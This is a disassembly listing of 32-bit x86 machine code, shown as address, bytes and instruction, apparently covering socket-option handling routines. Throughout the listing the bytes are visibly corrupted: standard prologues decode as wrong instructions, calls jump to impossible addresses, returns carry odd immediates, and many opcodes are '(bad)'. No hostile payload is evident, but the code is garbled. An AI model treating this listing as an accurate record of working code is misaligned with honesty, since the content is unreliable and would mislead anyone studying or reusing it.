  408a80:	55                   	push   %ebp
  408a81:	8b ec                	mov    %esp,%ebp
  408a83:	8b 45 08             	mov    0x8(%ebp),%eax
  408a86:	50                   	push   %eax
  408a87:	ff a8 14 b4 40 00    	ljmp   *0x40b414(%eax)
  408a8d:	83 c4 04             	add    $0x4,%esp
  408a90:	85 c0                	test   %eax,%eax
  408a92:	74 13                	je     0x408aa7
  408a94:	8b 4d 10             	mov    0x10(%ebp),%ecx
  408a97:	8b 47 0c             	mov    0xc(%edi),%eax
  408a9a:	50                   	push   %eax
  408a9b:	51                   	push   %ecx
  408a9c:	52                   	push   %edx
  408a9d:	e8 de fc ff ff       	call   0x408780
  408aa2:	83 c4 0c             	add    $0xc,%esp
  408aa5:	5d                   	pop    %ebp
  408aa6:	c3                   	ret
  408aa7:	8b 13                	mov    (%ebx),%edx
  408aa9:	10 8b 4d 0c 3c 54    	adc    %cl,0x543c0c4d(%ebx)
  408aaf:	f9                   	stc
  408ab0:	40                   	inc    %eax
  408ab1:	e1 50                	loope  0x408b03
  408ab3:	51                   	push   %ecx
  408ab4:	e8 c7 fc 7b bb       	call   0xbbbc8780
  408ab9:	83 c4 0c             	add    $0xc,%esp
  408abc:	5d                   	pop    %ebp
  408abd:	c3                   	ret
  408abe:	90                   	nop
  408abf:	90                   	nop
  408ac0:	55                   	push   %ebp
  408ac1:	8e ec                	mov    %esp,%gs
  408ac3:	83 a6 c5 8b 4d 27 56 	andl   $0x56,0x274d8bc5(%esi)
  408aca:	95                   	xchg   %eax,%ebp
  408acb:	40                   	inc    %eax
  408acc:	10 89 4d f8 8b 4d    	adc    %cl,0x4d8bf84d(%ecx)
  408ad2:	08 6a 00             	or     %ch,0x0(%edx)
  408ad5:	8b 06                	mov    (%esi),%eax
  408ad7:	6a 00                	push   $0x0
  408ad9:	8d 55 fc             	lea    -0x4(%ebp),%edx
  408adc:	89 45 f4             	mov    %eax,-0xc(%ebp)
  408adf:	e8 00 52 8b d7       	call   0xd7cbdce4
  408ae4:	04 8d                	add    $0x8d,%al
  408ae6:	be 26 6a 01 50       	mov    $0x50016a26,%esi
  408aeb:	f3 c7 45 fc d5 00 00 	xrelease movl $0xd5,-0x4(%ebp)
  408af2:	00 
  408af3:	71 15                	jno    0x408b0a
  408af5:	79 cb                	jns    0x408ac2
  408af7:	9a 00 83 cc ff 75 2c 	lcall  $0x2c75,$0xffcc8300
  408afe:	57                   	push   %edi
  408aff:	8b 09                	mov    (%ecx),%ecx
  408b01:	d8 c1                	fadd   %st(1),%st
  408b03:	40                   	inc    %eax
  408b04:	00 ff                	add    %bh,%bh
  408b06:	d7                   	xlat   %ds:(%ebx)
  408b07:	85 c0                	test   %eax,%eax
  408b09:	47                   	inc    %edi
  408b0a:	0a 89 06 5f 5e 8b    	or     -0x74a1a0fa(%ecx),%cl
  408b10:	64 5d                	fs pop %ebp
  408b12:	c2 0c 00             	ret    $0xc
  408b15:	ff d7                	call   *%edi
  408b17:	75 06                	jne    0x408b1f
  408b19:	00 00                	add    %al,(%eax)
  408b1b:	00 00                	add    %al,(%eax)
  408b1d:	14 05                	adc    $0x5,%al
  408b1f:	80 c1 0a             	add    $0xa,%cl
  408b22:	00 5e 8b             	add    %bl,-0x75(%esi)
  408b25:	e5 5d                	in     $0x5d,%eax
  408b27:	c2 0c 00             	ret    $0xc
  408b2a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408b2d:	89 06                	mov    %eax,(%esi)
  408b2f:	33 c0                	xor    %eax,%eax
  408b31:	5e                   	pop    %esi
  408b32:	8b e5                	mov    %ebp,%esp
  408b34:	5d                   	pop    %ebp
  408b35:	c2 0c 13             	ret    $0x130c
  408b38:	90                   	nop
  408b39:	90                   	nop
  408b3a:	90                   	nop
  408b3b:	90                   	nop
  408b3c:	e0 81                	loopne 0x408abf
  408b3e:	1d 90 55 8b ec       	sbb    $0xec8b5590,%eax
  408b43:	83 ec 10             	sub    $0x10,%esp
  408b46:	e3 57                	jecxz  0x408b9f
  408b48:	0c 56                	or     $0x56,%al
  408b4a:	8b 75 15             	mov    0x15(%ebp),%esi
  408b4d:	6a 00                	push   $0x0
  408b4f:	8d 55 f8             	lea    -0x8(%ebp),%edx
  408b52:	6a 00                	push   $0x0
  408b54:	8b 06                	mov    (%esi),%eax
  408b56:	52                   	push   %edx
  408b57:	eb 55                	jmp    0x408bae
  408b59:	65 89 45 f0          	mov    %eax,%gs:-0x10(%ebp)
  408b5d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408b60:	89 4d 35             	mov    %ecx,0x35(%ebp)
  408b63:	50                   	push   %eax
  408b64:	8b 42 5b             	mov    0x5b(%edx),%eax
  408b67:	8d 38                	lea    (%eax),%edi
  408b69:	f0 6a 01             	lock push $0x1
  408b6c:	51                   	push   %ecx
  408b6d:	50                   	push   %eax
  408b6e:	77 45                	ja     0x408bb5
  408b70:	fc                   	cld
  408b71:	00 00                	add    %al,(%eax)
  408b73:	7f 00                	jg     0x408b75
  408b75:	c7 45 68 00 00 00 00 	movl   $0x0,0x68(%ebp)
  408b7c:	ff 15 b2 78 40 00    	call   *0x4078b2
  408b82:	83 f8 ff             	cmp    $0xffffffff,%eax
  408b85:	75 79                	jne    0x408c00
  408b87:	57                   	push   %edi
  408b88:	e8 29 d3 c7 40       	call   0x41085eb6
  408b8d:	35 ff d7 85 27       	xor    $0x2785d7ff,%eax
  408b92:	75 0a                	jne    0x408b9e
  408b94:	92                   	xchg   %eax,%edx
  408b95:	06                   	push   %es
  408b96:	fc                   	cld
  408b97:	5e                   	pop    %esi
  408b98:	8b e5                	mov    %ebp,%esp
  408b9a:	e6 c2                	out    %al,$0xc2
  408b9c:	0c 00                	or     $0x0,%al
  408b9e:	ff d7                	call   *%edi
  408ba0:	c7 06 d9 00 00 00    	movl   $0xd9,(%esi)
  408ba6:	5f                   	pop    %edi
  408ba7:	05 80 fc 0a 3f       	add    $0x3f0afc80,%eax
  408bac:	51                   	push   %ecx
  408bad:	8b 0d 5d c2 0c 00    	mov    0xcc25d,%ecx
  408bb3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408bb6:	89 06                	mov    %eax,(%esi)
  408bb8:	5e                   	pop    %esi
  408bb9:	f7 d8                	neg    %eax
  408bbb:	1b c0                	sbb    %eax,%eax
  408bbd:	25 82 ee fe 02       	and    $0x2feee82,%eax
  408bc2:	05 7e 11 01 00       	add    $0x1117e,%eax
  408bc7:	95                   	xchg   %eax,%ebp
  408bc8:	e5 5d                	in     $0x5d,%eax
  408bca:	c2 0c 6d             	ret    $0x6d0c
  408bcd:	90                   	nop
  408bce:	90                   	nop
  408bcf:	90                   	nop
  408bd0:	80 8b fb 51 8b c2 08 	orb    $0x8,-0x3d74ae05(%ebx)
  408bd7:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408bda:	1e                   	push   %ds
  408bdb:	68 7e c9 3a 80       	push   $0x803ac97e
  408be0:	d4 c7                	aam    $0xc7
  408be2:	39 fc                	cmp    %edi,%esp
  408be4:	00 00                	add    %al,(%eax)
  408be6:	b8 00 ff 15 b4       	mov    $0xb415ff00,%eax
  408beb:	c1 40 00 83          	roll   $0x83,0x0(%eax)
  408bef:	f8                   	clc
  408bf0:	ff 75 9b             	push   -0x65(%ebp)
  408bf3:	00 8b 35 d8 e3 40    	add    %cl,0x40e3d835(%ebx)
  408bf9:	00 ff                	add    %bh,%bh
  408bfb:	d6                   	salc
  408bfc:	85 c0                	test   %eax,%eax
  408bfe:	75 05                	jne    0x408c05
  408c00:	5e                   	pop    %esi
  408c01:	8b e5                	mov    %ebp,%esp
  408c03:	5d                   	pop    %ebp
  408c04:	8d 00                	lea    (%eax),%eax
  408c06:	d6                   	salc
  408c07:	05 80 fc 0a 91       	add    $0x910afc80,%eax
  408c0c:	5e                   	pop    %esi
  408c0d:	2a e5                	sub    %ch,%ah
  408c0f:	5d                   	pop    %ebp
  408c10:	c3                   	ret
  408c11:	33 c0                	xor    %eax,%eax
  408c13:	f6 d1                	not    %cl
  408c15:	5d                   	pop    %ebp
  408c16:	c3                   	ret
  408c17:	90                   	nop
  408c18:	90                   	nop
  408c19:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408c1a:	90                   	nop
  408c1b:	90                   	nop
  408c1c:	90                   	nop
  408c1d:	90                   	nop
  408c1e:	90                   	nop
  408c1f:	30 55 8b             	xor    %dl,-0x75(%ebp)
  408c22:	ec                   	in     (%dx),%al
  408c23:	51                   	push   %ecx
  408c24:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408c27:	8d be fc 50 88 7e    	lea    0x7e8850fc(%esi),%edi
  408c2d:	66 04 80             	data16 add $0x80,%al
  408c30:	c0 9c b6 fc 01 00 00 	rcrb   $0x5,0x1fc(%esi,%esi,4)
  408c37:	05 
  408c38:	ff 15 b4 c1 40 00    	call   *0x40c1b4
  408c3e:	83 bb ff 75 1e 56 8b 	cmpl   $0xffffff8b,0x561e75ff(%ebx)
  408c45:	35 d8 c1 40 00       	xor    $0x40c1d8,%eax
  408c4a:	ff d6                	call   *%esi
  408c4c:	82 c0 75             	add    $0x75,%al
  408c4f:	05 5e 8b e5 74       	add    $0x74e58b5e,%eax
  408c54:	c3                   	ret
  408c55:	ff d6                	call   *%esi
  408c57:	43                   	inc    %ebx
  408c58:	80 68 0a 00          	subb   $0x0,0xa(%eax)
  408c5c:	5e                   	pop    %esi
  408c5d:	8b 32                	mov    (%edx),%esi
  408c5f:	5d                   	pop    %ebp
  408c60:	c3                   	ret
  408c61:	47                   	inc    %edi
  408c62:	c0 8b e5 5d c3 90 90 	rorb   $0x90,-0x6f3ca21b(%ebx)
  408c69:	dd c4                	ffree  %st(4)
  408c6b:	10 90 90 90 90 55    	adc    %dl,0x55909090(%eax)
  408c71:	8b ec                	mov    %esp,%ebp
  408c73:	53                   	push   %ebx
  408c74:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  408c77:	56                   	push   %esi
  408c78:	8b 75 b7             	mov    -0x49(%ebp),%esi
  408c7b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408c7c:	8b 68 10             	mov    0x10(%eax),%ebp
  408c7f:	bd 87 0b e9 75       	mov    $0x75e90b87,%ebp
  408c84:	29 8b 30 20 8b 46    	sub    %ecx,0x468b2030(%ebx)
  408c8a:	24 0b                	and    $0xb,%al
  408c8c:	c8 0f 84 8f          	enter  $0x840f,$0x8f
  408c90:	01 00                	add    %eax,(%eax)
  408c92:	00 13                	add    %dl,(%ebx)
  408c94:	56                   	push   %esi
  408c95:	04 52                	add    $0x52,%al
  408c97:	73 84                	jae    0x408c1d
  408c99:	ff                   	(bad)
  408c9a:	ff                   	(bad)
  408c9b:	ff 83 1f 04 58 05    	incl   0x558041f(%ebx)
  408ca1:	0f                   	movlps %xmm6,(bad)
  408ca2:	13 f6                	adc    %esi,%esi
  408ca4:	01 00                	add    %eax,(%eax)
  408ca6:	00 f2                	add    %dh,%dl
  408ca8:	5e                   	pop    %esi
  408ca9:	5b                   	pop    %ebx
  408caa:	56                   	push   %esi
  408cab:	c2 0c 00             	ret    $0xc
  408cae:	85 ff                	test   %edi,%edi
  408cb0:	da 8c 9b 00 00 00 7f 	fimull 0x7f000000(%ebx,%ebx,4)
  408cb7:	08 85 db 0f 86 87    	or     %al,-0x7879f025(%ebp)
  408cbd:	00 00                	add    %al,(%eax)
  408cbf:	77 8b                	ja     0x408c4c
  408cc1:	59                   	pop    %ecx
  408cc2:	14 8b                	adc    $0x8b,%al
  408cc4:	4e                   	dec    %esi
  408cc5:	24 0b                	and    $0xb,%al
  408cc7:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408cc8:	64 14 8b             	fs adc $0x8b,%al
  408ccb:	4e                   	dec    %esi
  408ccc:	d3 51 e8             	rcll   %cl,-0x18(%ecx)
  408ccf:	fd                   	std
  408cd0:	fe                   	(bad)
  408cd1:	ff                   	(bad)
  408cd2:	ff 64 c4 53          	jmp    *0x53(%esp,%eax,8)
  408cd6:	85 c0                	test   %eax,%eax
  408cd8:	0f 85 c7 ae f5 00    	jne    0x1363ba5
  408cde:	8b 56 54             	mov    0x54(%esi),%edx
  408ce1:	3b d3                	cmp    %ebx,%edx
  408ce3:	75 0b                	jne    0x408cf0
  408ce5:	8b 46 24             	mov    0x24(%esi),%eax
  408ce8:	3b c7                	cmp    %edi,%eax
  408cea:	0f 57 ad 00 00 00 8b 	xorps  -0x75000000(%ebp),%xmm5
  408cf1:	4d                   	dec    %ebp
  408cf2:	47                   	inc    %edi
  408cf3:	6c                   	insb   (%dx),%es:(%edi)
  408cf4:	00 68 e8             	add    %ch,-0x18(%eax)
  408cf7:	87 00                	xchg   %eax,(%eax)
  408cf9:	a3 51 53 8d 08       	mov    %eax,0x88d5351
  408cfe:	18 86 8c 28 00 00    	sbb    %al,0x288c(%esi)
  408d04:	8b 56 04             	mov    0x4(%esi),%edx
  408d07:	8b 1d 07 c1 58 8f    	mov    0x8f58c107,%ebx
  408d0d:	6a 04                	push   $0x4
  408d0f:	57                   	push   %edi
  408d10:	3f                   	aas
  408d11:	06                   	push   %es
  408d12:	10 00                	adc    %al,(%eax)
  408d14:	00 3a                	add    %bh,(%edx)
  408d16:	ff                   	(bad)
  408d17:	ff 99 00 52 89 07    	lcall  *0x7895200(%ecx)
  408d1d:	ff d3                	call   *%ebx
  408d1f:	8b 46 70             	mov    0x70(%esi),%eax
  408d22:	6a de                	push   $0xffffffde
  408d24:	57                   	push   %edi
  408d25:	68 05 c5 05 00       	push   $0x5c505
  408d2a:	68 ff ff 00 60       	push   $0x6000ffff
  408d2f:	50                   	push   %eax
  408d30:	ff d3                	call   *%ebx
  408d32:	ae                   	scas   %es:(%edi),%al
  408d33:	7d 10                	jge    0x408d45
  408d35:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  408d38:	89 c9                	mov    %ecx,%ecx
  408d3a:	24 89                	and    $0x89,%al
  408d3c:	5e                   	pop    %esi
  408d3d:	20 5f 5e             	and    %bl,0x5e(%edi)
  408d40:	33 c0                	xor    %eax,%eax
  408d42:	ce                   	into
  408d43:	14 c2                	adc    $0xc2,%al
  408d45:	0c 00                	or     $0x0,%al
  408d47:	85 aa 7f e1 7c 04    	test   %ebp,0x47ce17f(%edx)
  408d4d:	85 be 73 4c 8b 4e    	test   %edi,0x4e8b4c73(%esi)
  408d53:	04 c7                	add    $0xc7,%al
  408d55:	45                   	inc    %ebp
  408d56:	08 00                	or     %al,(%eax)
  408d58:	7c 00                	jl     0x408d5a
  408d5a:	43                   	inc    %ebx
  408d5b:	51                   	push   %ecx
  408d5c:	ff 6f fe             	ljmp   *-0x2(%edi)
  408d5f:	ff                   	(bad)
  408d60:	ff 83 c4 64 85 c0    	incl   -0x3f7a9b3c(%ebx)
  408d66:	75 3d                	jne    0x408da5
  408d68:	8b 46 04             	mov    0x4(%esi),%eax
  408d6b:	d1 3d b8 c1 40 00    	sarl   $1,0x40c1b8
  408d71:	8d 55 08             	lea    0x8(%ebp),%edx
  408d74:	59                   	pop    %ecx
  408d75:	04 52                	add    $0x52,%al
  408d77:	68 06 f5 1d 00       	push   $0x1df506
  408d7c:	68 ff ff 64 00       	push   $0x64ffff
  408d81:	50                   	push   %eax
  408d82:	ff d7                	call   *%edi
  408d84:	8b 56 04             	mov    0x4(%esi),%edx
  408d87:	8d 4d 08             	lea    0x8(%ebp),%ecx
  408d8a:	6a 04                	push   $0x4
  408d8c:	51                   	push   %ecx
  408d8d:	68 05 10 0f be       	push   $0xbe0f1005
  408d92:	68 ff ff 24 00       	push   $0x24ffff
  408d97:	52                   	push   %edx
  408d98:	ff d7                	call   *%edi
  408d9a:	8b 03                	mov    (%ebx),%eax
  408d9c:	10 89 5e 20 89 7e    	adc    %cl,0x7e89205e(%ecx)
  408da2:	24 33                	and    $0x33,%al
  408da4:	c0 54 5e eb 5d       	rclb   $0x5d,-0x15(%esi,%ebx,2)
  408da9:	c2 0c 00             	ret    $0xc
  408dac:	90                   	nop
  408dad:	90                   	nop
  408dae:	90                   	nop
  408daf:	90                   	nop
  408db0:	55                   	push   %ebp
  408db1:	8b ec                	mov    %esp,%ebp
  408db3:	04 08                	add    $0x8,%al
  408db5:	45                   	inc    %ebp
  408db6:	10 33                	adc    %dh,(%ebx)
  408db8:	c9                   	leave
  408db9:	85 c0                	test   %eax,%eax
  408dbb:	0f ff c1             	ud0    %ecx,%eax
  408dbe:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  408dc1:	8b 4d c3             	mov    -0x3d(%ebp),%ecx
  408dc4:	83 f9 40             	cmp    $0x40,%ecx
  408dc7:	23 0f                	and    (%edi),%ecx
  408dc9:	8f                   	(bad)
  408dca:	75 02                	jne    0x408dce
  408dcc:	00 ca                	add    %cl,%dl
  408dce:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  408dcf:	84 c1                	test   %al,%cl
  408dd1:	02 00                	add    (%eax),%al
  408dd3:	00 49 54             	add    %cl,0x54(%ecx)
  408dd6:	f9                   	stc
  408dd7:	0f                   	(bad)
  408dd8:	0f 87 1c 03 00 00    	ja     0x4090fa
  408dde:	33 d2                	xor    %edx,%edx
  408de0:	8a 38                	mov    (%eax),%bh
  408de2:	3f                   	aas
  408de3:	91                   	xchg   %eax,%ecx
  408de4:	40                   	inc    %eax
  408de5:	00 ff                	add    %bh,%bh
  408de7:	24 95                	and    $0x95,%al
  408de9:	84 90 40 00 8b 75    	test   %dl,0x758b0040(%eax)
  408def:	af                   	scas   %es:(%edi),%eax
  408df0:	33 d2                	xor    %edx,%edx
  408df2:	8b 4e 38             	mov    0x38(%esi),%ecx
  408df5:	83 e1 02             	and    $0x2,%ecx
  408df8:	80 f9 c4             	cmp    $0xc4,%cl
  408dfb:	0f 94 c2             	sete   %dl
  408dfe:	3b a6 74 9a 9c 4e    	cmp    0x4e9c9a74(%esi),%esp
  408e04:	b0 8d                	mov    $0x8d,%al
  408e06:	45                   	inc    %ebp
  408e07:	fc                   	cld
  408e08:	6a 04                	push   $0x4
  408e0a:	50                   	push   %eax
  408e0b:	6a bc                	push   $0xffffffbc
  408e0d:	68 ff ff 01 00       	push   $0x1ffff
  408e12:	23 ff                	and    %edi,%edi
  408e14:	9c                   	pushf
  408e15:	54                   	push   %esp
  408e16:	71 40                	jno    0x408e58
  408e18:	00 83 f8 ff 0f 84    	add    %al,-0x7bf00008(%ebx)
  408e1e:	43                   	inc    %ebx
  408e1f:	02 00                	add    (%eax),%al
  408e21:	00 8b 26 10 90 c0    	add    %cl,-0x3f6fefda(%ebx)
  408e27:	8b 46 38             	mov    0x38(%esi),%eax
  408e2a:	74 0e                	je     0x408e3a
  408e2c:	0c f7                	or     $0xf7,%al
  408e2e:	89 ec                	mov    %ebp,%esp
  408e30:	df 33                	fbstp  (%ebx)
  408e32:	c0 fa 8b             	sar    $0x8b,%dl
  408e35:	e5 87                	in     $0x87,%eax
  408e37:	c2 af 48             	ret    $0x48af
  408e3a:	24 04                	and    $0x4,%al
  408e3c:	89 46 38             	mov    %eax,0x38(%esi)
  408e3f:	66 fb                	data16 sti
  408e41:	5e                   	pop    %esi
  408e42:	fc                   	cld
  408e43:	c4 c7 c2 0c          	(bad)
  408e47:	00 8b 75 08 33 c9    	add    %cl,-0x36ccf78b(%ebx)
  408e4d:	8b 56 77             	mov    0x77(%esi),%edx
  408e50:	83 e2 04             	and    $0x4,%edx
  408e53:	d6                   	salc
  408e54:	fa                   	cli
  408e55:	04 0f                	add    $0xf,%al
  408e57:	94                   	xchg   %eax,%esp
  408e58:	63 3b                	arpl   %edi,(%ebx)
  408e5a:	c1 74 d4 8b 46       	shll   $0x46,-0x75(%esp,%edx,8)
  408e5f:	40                   	inc    %eax
  408e60:	22 55 00             	and    0x0(%ebp),%dl
  408e63:	6a 04                	push   $0x4
  408e65:	52                   	push   %edx
  408e66:	6a 01                	push   $0x1
  408e68:	68 ff ff 00 00       	push   $0xffff
  408e6d:	50                   	push   %eax
  408e6e:	ff 15 b8 c1 40 00    	call   *0x40c1b8
  408e74:	d1 f8                	sar    $1,%eax
  408e76:	bd 0f 84 e8 01       	mov    $0x1e8840f,%ebp
  408e7b:	00 00                	add    %al,(%eax)
  408e7d:	8b 45 10             	mov    0x10(%ebp),%eax
  408e80:	85 cd                	test   %ecx,%ebp
  408e82:	8b 46 53             	mov    0x53(%esi),%eax
  408e85:	74 0e                	je     0x408e95
  408e87:	0c e2                	or     $0xe2,%al
  408e89:	89 46 b9             	mov    %eax,-0x47(%esi)
  408e8c:	33 7b 5e             	xor    0x5e(%ebx),%edi
  408e8f:	8b e5                	mov    %ebp,%esp
  408e91:	5d                   	pop    %ebp
  408e92:	c2 0c 00             	ret    $0xc
  408e95:	24 fb                	and    $0xfb,%al
  408e97:	89 46 38             	mov    %eax,0x38(%esi)
  408e9a:	33 c0                	xor    %eax,%eax
  408e9c:	5e                   	pop    %esi
  408e9d:	06                   	push   %es
  408e9e:	e5 5d                	in     $0x5d,%eax
  408ea0:	0b 0c 00             	or     (%eax,%eax,1),%ecx
  408ea3:	84 75 df             	test   %dh,-0x21(%ebp)
  408ea6:	33 d2                	xor    %edx,%edx
  408ea8:	8b 4e 38             	mov    0x38(%esi),%ecx
  408eab:	83 e1 10             	and    $0x10,%ecx
  408eae:	80 f9 10             	cmp    $0x10,%cl
  408eb1:	0f 94 c2             	sete   %dl
  408eb4:	3b c2                	cmp    %edx,%eax
  408eb6:	0f 84 b5 ff ff ff    	je     0x408e71
  408ebc:	8b 35 1b 5f 45 bb    	mov    0xbb455f1b,%esi
  408ec2:	6a 04                	push   $0x4
  408ec4:	50                   	push   %eax
  408ec5:	6a 04                	push   $0x4
  408ec7:	68 ff 71 00 00       	push   $0x71ff
  408ecc:	51                   	push   %ecx
  408ecd:	ff 15 b8 c1 40 00    	call   *0x40c1b8
  408ed3:	83 46 ff fc          	addl   $0xfffffffc,-0x1(%esi)
  408ed7:	84 9f 01 00 0c ab    	test   %bl,-0x54f3ffff(%edi)
  408edd:	45                   	inc    %ebp
  408ede:	10 85 c0 8b 46 38    	adc    %al,0x38468bc0(%ebp)
  408ee4:	74 0e                	je     0x408ef4
  408ee6:	0c 10                	or     $0x10,%al
  408ee8:	67 46                	addr16 inc %esi
  408eea:	38 33                	cmp    %dh,(%ebx)
  408eec:	c0 5e 43 e5          	rcrb   $0xe5,0x43(%esi)
  408ef0:	5d                   	pop    %ebp
  408ef1:	c2 0c a4             	ret    $0xa40c
  408ef4:	24 fe                	and    $0xfe,%al
  408ef6:	89 46 38             	mov    %eax,0x38(%esi)
  408ef9:	33 c0                	xor    %eax,%eax
  408efb:	5e                   	pop    %esi
  408efc:	8b e5                	mov    %ebp,%esp
  408efe:	09 c2                	or     %eax,%edx
  408f00:	0c 00                	or     $0x0,%al
  408f02:	8b de                	mov    %esi,%ebx
  408f04:	08 33                	or     %dh,(%ebx)
  408f06:	c9                   	leave
  408f07:	8b 56 38             	mov    0x38(%esi),%edx
  408f0a:	83 e2 08             	and    $0x8,%edx
  408f0d:	80 fa 08             	cmp    $0x8,%dl
  408f10:	0f 94 c1             	sete   %cl
  408f13:	3b c8                	cmp    %eax,%ecx
  408f15:	0f b3 16             	btr    %edx,(%esi)
  408f18:	ff                   	(bad)
  408f19:	ff                   	(bad)
  408f1a:	ff 85 c0 74 17 8b    	incl   -0x74e88b40(%ebp)
  408f20:	56                   	push   %esi
  408f21:	19 52 e8             	sbb    %edx,-0x18(%edx)
  408f24:	36 fc                	ss cld
  408f26:	ff                   	(bad)
  408f27:	ff 83 c4 04 85 ca    	incl   -0x357afb3c(%ebx)
  408f2d:	9a 1b 5e 8b e5 5d c2 	lcall  $0xc25d,$0xe58b5e1b
  408f34:	0c 00                	or     $0x0,%al
  408f36:	8b 46 04             	mov    0x4(%esi),%eax
  408f39:	50                   	push   %eax
  408f3a:	e8 91 00 ff ff       	call   0x3f8fd0
  408f3f:	83 c4 04             	add    $0x4,%esp
  408f42:	85 c0                	test   %eax,%eax
  408f44:	0f 85 a5 01 9a 00    	jne    0xda90ef
  408f4a:	8b 45 10             	mov    0x10(%ebp),%eax
  408f4d:	85 c0                	test   %eax,%eax
  408f4f:	8b 46 38             	mov    0x38(%esi),%eax
  408f52:	74 0e                	je     0x408f62
  408f54:	40                   	inc    %eax
  408f55:	38 d1                	cmp    %dl,%cl
  408f57:	46                   	inc    %esi
  408f58:	38 33                	cmp    %dh,(%ebx)
  408f5a:	c0 5e b4 e5          	rcrb   $0xe5,-0x4c(%esi)
  408f5e:	5d                   	pop    %ebp
  408f5f:	c2 0c 00             	ret    $0xc
  408f62:	24 f7                	and    $0xf7,%al
  408f64:	ee                   	out    %al,(%dx)
  408f65:	e3 38                	jecxz  0x408f9f
  408f67:	33 c0                	xor    %eax,%eax
  408f69:	5e                   	pop    %esi
  408f6a:	8b e5                	mov    %ebp,%esp
  408f6c:	5d                   	pop    %ebp
  408f6d:	c2 0c a7             	ret    $0xa70c
  408f70:	8b 75 08             	mov    0x8(%ebp),%esi
  408f73:	8b 4e 38             	mov    0x38(%esi),%ecx
  408f76:	83 e1 01             	and    $0x1,%ecx
  408f79:	fe                   	(bad)
  408f7a:	1b f6                	sbb    %esi,%esi
  408f7c:	d9 1b                	fstps  (%ebx)
  408f7e:	c9                   	leave
  408f7f:	41                   	inc    %ecx
  408f80:	3b c8                	cmp    %eax,%ecx
  408f82:	0f 84 5c be ff ff    	je     0x404de4
  408f88:	8d 55 08             	lea    0x8(%ebp),%edx
  408f8b:	6a 04                	push   $0x4
  408f8d:	f2 89 45 08          	repnz mov %eax,0x8(%ebp)
  408f91:	8b 46 04             	mov    0x4(%esi),%eax
  408f94:	42                   	inc    %edx
  408f95:	08 80 6d 00 00 b7    	or     %al,-0x48ffff93(%eax)
  408f9b:	ff                   	(bad)
  408f9c:	ff 00                	incl   (%eax)
  408f9e:	00 cc                	add    %cl,%ah
  408fa0:	be c7 45 0a 1e       	mov    $0x1e0a45c7,%esi
  408fa5:	00 2a                	add    %ch,(%edx)
  408fa7:	15 b8 c1 40 00       	adc    $0x40c1b8,%eax
  408fac:	58                   	pop    %eax
  408fad:	f8                   	clc
  408fae:	ff                   	(bad)
  408faf:	b8 d4 b0 00 00       	mov    $0xb0d4,%eax
  408fb4:	00 8b 45 10 85 c0    	add    %cl,-0x3f7aefbb(%ebx)
  408fba:	8b b0 38 7e 0e 0c    	mov    0xc0e7e38(%eax),%esi
  408fc0:	01 89 46 38 33 09    	add    %ecx,0x9333846(%ecx)
  408fc6:	5e                   	pop    %esi
  408fc7:	9d                   	popf
  408fc8:	e5 6c                	in     $0x6c,%eax
  408fca:	c2 0c 00             	ret    $0xc
  408fcd:	24 75                	and    $0x75,%al
  408fcf:	89 46 41             	mov    %eax,0x41(%esi)
  408fd2:	7c c0                	jl     0x408f94
  408fd4:	34 8b                	xor    $0x8b,%al
  408fd6:	e5 5d                	in     $0x5d,%eax
  408fd8:	21 0c 00             	and    %ecx,(%eax,%eax,1)
  408fdb:	8b 55 77             	mov    0x77(%ebp),%edx
  408fde:	67 82 10 7b          	adcb   $0x7b,(%bx,%si)
  408fe2:	04 9a                	add    $0x9a,%al
  408fe4:	af                   	scas   %es:(%edi),%eax
  408fe5:	42                   	inc    %edx
  408fe6:	04 5d                	add    $0x5d,%al
  408fe8:	01 86 00 00 68 ff    	add    %eax,-0x980000(%esi)
  408fee:	ff 00                	incl   (%eax)
  408ff0:	00 50 ff             	add    %dl,-0x1(%eax)
  408ff3:	7b b8                	jnp    0x408fad
  408ff5:	c1 40 00 83          	roll   $0x83,0x0(%eax)
  408ff9:	f8                   	clc
  408ffa:	ff 0f                	decl   (%edi)
  408ffc:	d0 82 fe ff ff eb    	rolb   $1,-0x14000002(%edx)
  409002:	62 81 f9 00 5f 00    	bound  %eax,0x5f00f9(%ecx)
  409008:	00 0f                	add    %cl,(%edi)
  40900a:	8f c7                	pop    %edi
  40900c:	00 73 e0             	add    %dh,-0x20(%ebx)
  40900f:	0f 84 d5 00 00 00    	je     0x4090ea
  409015:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  40901b:	0f 84 8d a7 00 00    	je     0x4137ae
  409021:	8d                   	lea    (bad),%edi
  409022:	f9                   	stc
  409023:	00 02                	add    %al,(%edx)
  409025:	00 00                	add    %al,(%eax)
  409027:	0f 85 2a 00 00 00    	jne    0x409057
  40902d:	8b 9d 08 33 d2 87    	mov    -0x782dccf8(%ebp),%ebx
  409033:	4e                   	dec    %esi
  409034:	38 81 6b 00 02 00    	cmp    %al,0x2006b(%ecx)
  40903a:	9b                   	fwait
  40903b:	83 f9 77             	cmp    $0x77,%ecx
  40903e:	02 00                	add    (%eax),%al
  409040:	00 0f                	add    %cl,(%edi)
  409042:	34 c2                	xor    $0xc2,%al
  409044:	1f                   	pop    %ds
  409045:	d0 0f                	rorb   $1,(%edi)
  409047:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  409048:	e5 fd                	in     $0xfd,%eax
  40904a:	ff                   	(bad)
  40904b:	ff 8b 4e 04 8d ab    	decl   -0x5472fbb2(%ebx)
  409051:	17                   	pop    %ss
  409052:	6a a5                	push   $0xffffffa5
  409054:	50                   	push   %eax
  409055:	6a 88                	push   $0xffffff88
  409057:	6a 06                	push   $0x6
  409059:	51                   	push   %ecx
  40905a:	ff 87 00 60 40 00    	incl   0x406000(%edi)
  409060:	83 f8 ff             	cmp    $0xffffffff,%eax
  409063:	75 21                	jne    0x409086
  409065:	8b 35 d8 c1 40 00    	mov    0x40c1d8,%esi
  40906b:	ff d6                	call   *%esi
  40906d:	85 4c 75 07          	test   %ecx,0x7(%ebp,%esi,2)
  409071:	5e                   	pop    %esi
  409072:	8b 08                	mov    (%eax),%ecx
